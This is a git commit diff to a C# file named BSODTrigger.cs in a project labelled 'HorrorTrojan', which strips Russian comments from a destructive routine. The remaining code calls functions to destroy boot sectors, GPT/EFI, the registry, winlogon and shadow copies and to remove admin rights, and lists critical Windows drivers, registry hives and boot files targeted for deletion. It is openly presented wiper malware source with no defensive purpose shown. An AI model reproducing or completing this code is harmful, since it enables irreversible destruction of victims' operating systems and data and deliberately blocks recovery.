75ef9cbfcc50e1c41df1defdc363521451d49f8d
Virusodel <134794046+Virusodel@users.noreply.github.com>
2026-08-29 10:09:41 +0300

    Update BSODTrigger.cs

--- Trojan/BSODTrigger.cs
+++ Trojan/BSODTrigger.cs
@@ -21,25 +21,12 @@ namespace HorrorTrojan
         {
             try
             {
-                // ===== 1. УНИЧТОЖЕНИЕ ЗАГРУЗЧИКОВ =====
                 DestroyBootSectors();
-                
-                // ===== 2. УНИЧТОЖЕНИЕ GPT И EFI =====
                 DestroyGPTandEFI();
-                
-                // ===== 3. УНИЧТОЖЕНИЕ СИСТЕМНЫХ ФАЙЛОВ (КРОМЕ КРИТИЧЕСКИХ) =====
                 DestroySystemFiles();
-                
-                // ===== 4. УНИЧТОЖЕНИЕ РЕЕСТРА =====
                 DestroyRegistry();
-                
-                // ===== 5. УНИЧТОЖЕНИЕ WINLOGON =====
                 DestroyWinlogon();
-                
-                // ===== 6. УНИЧТОЖЕНИЕ ТЕНЕВЫХ КОПИЙ =====
                 DestroyShadowCopies();
-                
-                // ===== 7. ЛИШЕНИЕ ПРАВ АДМИНИСТРАТОРА =====
                 RemoveAdminRights();
             }
             catch { }
@@ -121,40 +108,28 @@ namespace HorrorTrojan
                 // ntdll.dll, kernel32.dll, ntoskrnl.exe, hal.dll
                 // csrss.exe, services.exe, lsass.exe, svchost.exe, smss.exe, wininit.exe
                 
-                // ===== УДАЛЯЕМ ВСЁ ОСТАЛЬНОЕ =====
                 string[] systemFiles = new string[]
                 {
-                    // Winlogon (можно удалить, BSOD уже вызван)
                     @"C:\Windows\System32\winlogon.exe",
-                    
-                    // Драйверы
                     @"C:\Windows\System32\drivers\ntfs.sys",
                     @"C:\Windows\System32\drivers\fastfat.sys",
                     @"C:\Windows\System32\drivers\disk.sys",
                     @"C:\Windows\System32\drivers\partmgr.sys",
                     @"C:\Windows\System32\drivers\volmgr.sys",
                     @"C:\Windows\System32\drivers\mountmgr.sys",
-                    
-                    // Конфигурации
                     @"C:\Windows\System32\config\SYSTEM",
                     @"C:\Windows\System32\config\SOFTWARE",
                     @"C:\Windows\System32\config\SAM",
                     @"C:\Windows\System32\config\SECURITY",
                     @"C:\Windows\System32\config\DEFAULT",
                     @"C:\Windows\System32\config\BCD-Template",
-                    
-                    // Загрузочные файлы
                     @"C:\bootmgr",
                     @"C:\Boot\BCD",
                     @"C:\Boot\boot.sdi",
                     @"C:\Boot\BCD.LOG",
                     @"C:\boot\bootstat.dat",
-                    
-                    // Winload
                     @"C:\Windows\System32\winload.exe",
                     @"C:\Windows\System32\winload.efi",
-                    
-                    // Другие системные файлы (не критические для BSOD)
                     @"C:\Windows\System32\user32.dll",
                     @"C:\Windows\System32\gdi32.dll",
                     @"C:\Windows\System32\advapi32.dll",
